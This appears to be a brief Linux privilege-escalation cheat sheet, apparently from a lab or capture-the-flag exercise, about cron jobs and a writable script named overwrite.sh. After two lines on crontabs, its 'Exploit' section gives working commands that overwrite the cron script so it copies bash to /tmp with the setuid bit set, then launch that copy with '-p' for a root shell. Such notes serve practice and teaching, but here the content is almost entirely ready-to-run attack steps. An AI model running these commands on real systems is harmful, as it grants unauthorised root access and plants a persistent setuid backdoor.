

   ### Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
   ### Cron table files (crontabs) store the configuration for cron jobs. 
   ### The system-wide crontab is located at /etc/crontab.
    
          cat /etc/crontab
          locate overwrite.sh
          
          
   ## overwrite.sh Exploit
   
         echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
         chmod +x /home/user/overwrite.sh
         /tmp/bash -p
